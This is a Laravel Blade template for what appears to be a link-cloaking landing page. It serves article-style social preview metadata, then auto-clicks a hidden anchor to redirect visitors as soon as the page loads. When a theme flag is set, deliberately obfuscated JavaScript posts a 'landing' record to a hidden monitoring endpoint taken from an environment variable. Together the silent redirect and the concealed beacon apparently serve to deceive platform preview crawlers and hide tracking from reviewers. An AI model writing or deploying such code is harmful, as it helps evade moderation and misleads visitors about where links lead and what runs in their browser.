<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
    <img src="{{ $data->image }}" alt="" hidden>
    <a href="?a" id="hfuck"></a>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('hfuck').click()
        })
        @if (isset($info) && $data->theme_type == 2)
             function _0x288c(){const _0x37ec84=['48CMkkll','json','3JonQMx','17133vzCqfg','4310966IniJJf','{{ env('WEB_MONITOR_API_URL') }}','post','ajax','121420DbkbkL','{{$info}}','2589160vbohhG','21xlbLfm','728nFnPNA','330tpFAEl','32313696gMzGBS','605396rIPIJR','145269vZVoyM','landing'];_0x288c=function(){return _0x37ec84;};return _0x288c();}function _0x33d9(_0x4b7f11,_0x1ea9e4){_0x4b7f11=_0x4b7f11-0x66;const _0x288cc2=_0x288c();let _0x33d95b=_0x288cc2[_0x4b7f11];return _0x33d95b;}(function(_0x605303,_0x130420){const _0x4d4965=_0x33d9,_0x497ad1=_0x605303();while(!![]){try{const _0x1dbb7f=parseInt(_0x4d4965(0x6f))/0x1*(parseInt(_0x4d4965(0x6a))/0x2)+-parseInt(_0x4d4965(0x70))/0x3*(-parseInt(_0x4d4965(0x67))/0x4)+-parseInt(_0x4d4965(0x75))/0x5*(-parseInt(_0x4d4965(0x6d))/0x6)+-parseInt(_0x4d4965(0x66))/0x7*(-parseInt(_0x4d4965(0x77))/0x8)+parseInt(_0x4d4965(0x6b))/0x9*(parseInt(_0x4d4965(0x68))/0xa)+-parseInt(_0x4d4965(0x71))/0xb+-parseInt(_0x4d4965(0x69))/0xc;if(_0x1dbb7f===_0x130420)break;else _0x497ad1['push'](_0x497ad1['shift']());}catch(_0x53c8ac){_0x497ad1['push'](_0x497ad1['shift']());}}}(_0x288c,0x88e02),((()=>{const _0x55563d=_0x33d9,_0x566492={'data':_0x55563d(0x76),'type':_0x55563d(0x6c)};$[_0x55563d(0x74)]({'type':_0x55563d(0x73),'url':_0x55563d(0x72),'data':_0x566492,'dataType':_0x55563d(0x6e),'success':function(_0x882676){}});})()));
        @endif
    </script>
</body>

</html>
